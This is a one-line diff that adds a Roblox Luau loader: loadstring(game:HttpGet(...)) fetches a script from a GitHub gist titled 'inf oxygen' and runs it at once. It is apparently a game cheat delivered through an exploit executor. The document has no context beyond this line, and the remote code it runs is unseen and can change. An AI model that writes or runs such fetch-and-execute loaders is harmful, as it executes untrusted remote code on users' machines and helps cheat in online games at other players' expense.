@@ -1,0 +1,1 @@
+loadstring(game:httpGet('https://gist.githubusercontent.com/catswimmer/675a626d497f948e45c01fc981464654/raw/1b98aafe348cc235a4bafd5bdce37d76494bf1ee/inf%2520oxygen.luau'))()
